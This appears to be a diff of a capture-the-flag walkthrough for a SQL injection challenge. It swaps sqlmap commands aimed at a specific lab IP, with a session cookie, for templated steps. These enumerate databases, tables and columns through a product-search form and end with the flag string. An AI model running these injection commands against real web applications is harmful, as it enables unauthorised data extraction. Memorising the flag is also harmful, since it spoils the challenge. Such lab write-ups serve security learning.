@@ -1,11 +1,17 @@
-sqlmap -u "http://34.89.138.139:30296/index.php" --data="product_name=&submit=Search" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --dbs
+{link}/register.php
 
-sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" -forms -dbs
+enter % to "product name"
+go to burp and get Cookies 
 
-sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D shop --tables
+after in terminal
+sqlmap -u "{link}" --data="product_name=&submit=Search" --cookie="{cookies}" --dbs  
+// u can skip this and go to next, but if next isnt working use this
 
-sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D information_schema --tables
+sqlmap -u "{link}" --cookie="{cookies}" --forms --dbs 
+//here we get some databases, go to shop 
 
-sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D information_schema -T INNODB_SYS_TABLES --columns
+sqlmap -u "{link}" --cookie="{cookies}" --forms -D shop --columns
+// here we found table named CTF{1nformat1on_sch3ma_c4n_ and its colums
+//if we combine the name of tablle and its colums we get our flag
 
-sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D information_schema -T INNODB_SYS_TABLES -C FLAG --dump
+CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}
